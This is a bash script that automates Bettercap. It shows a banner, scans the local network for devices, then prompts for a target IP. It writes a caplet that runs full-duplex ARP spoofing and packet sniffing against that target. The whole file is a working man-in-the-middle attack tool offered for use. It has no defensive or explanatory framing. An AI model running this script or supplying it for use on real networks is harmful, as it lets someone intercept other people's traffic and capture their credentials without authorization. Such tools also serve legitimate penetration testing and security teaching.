#!/bin/bash

# Print the Tool Name
echo -e "
██████╗░███████╗████████╗████████╗███████╗██████╗░░█████╗░░█████╗░██████╗░  
██╔══██╗██╔════╝╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗  
██████╦╝█████╗░░░░░██║░░░░░░██║░░░█████╗░░██████╔╝██║░░╚═╝███████║██████╔╝  
██╔══██╗██╔══╝░░░░░██║░░░░░░██║░░░██╔══╝░░██╔══██╗██║░░██╗██╔══██║██╔═══╝░  
██████╦╝███████╗░░░██║░░░░░░██║░░░███████╗██║░░██║╚█████╔╝██║░░██║██║░░░░░  
╚═════╝░╚══════╝░░░╚═╝░░░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝░░░░░  

░█████╗░██╗░░░██╗████████╗░█████╗░███╗░░░███╗░█████╗░████████╗██╗░█████╗░███╗░░██╗
██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗████╗░████║██╔══██╗╚══██╔══╝██║██╔══██╗████╗░██║
███████║██║░░░██║░░░██║░░░██║░░██║██╔████╔██║███████║░░░██║░░░██║██║░░██║██╔██╗██║
██╔══██║██║░░░██║░░░██║░░░██║░░██║██║╚██╔╝██║██╔══██║░░░██║░░░██║██║░░██║██║╚████║
██║░░██║╚██████╔╝░░░██║░░░╚█████╔╝██║░╚═╝░██║██║░░██║░░░██║░░░██║╚█████╔╝██║░╚███║
╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░░╚════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░╚══╝ "

# Prompt user to enter the network interface
read -p "Enter the interface: " interface

# Create and configure a Bettercap caplet to show network information
echo "net.probe on" > spoof.cap
echo "set arp.spoof.fullduplex true" >> spoof.cap
echo "net.show" >> spoof.cap
echo "exit" >> spoof.cap

# Run Bettercap with the configured caplet and save the output to a file
bettercap -iface $interface -caplet spoof.cap > network_output.txt

# Pause for a moment to ensure Bettercap has finished
sleep 1

# Display the devices found in the network from the output file
echo "Device in the Network:"
sed -n '5,$p' network_output.txt

# Prompt user to enter the target IP address for ARP spoofing
read -p "Enter the target IP address: " ip

# Create and configure a Bettercap caplet to perform ARP spoofing and network sniffing
echo "net.probe on" > spoof.cap
echo "set arp.spoof.fullduplex true" >> spoof.cap
echo "set arp.spoof.targets $ip" >> spoof.cap
echo "arp.spoof on" >> spoof.cap
echo "net.sniff on" >> spoof.cap

# Run Bettercap with the new configured caplet
bettercap -iface $interface -caplet spoof.cap

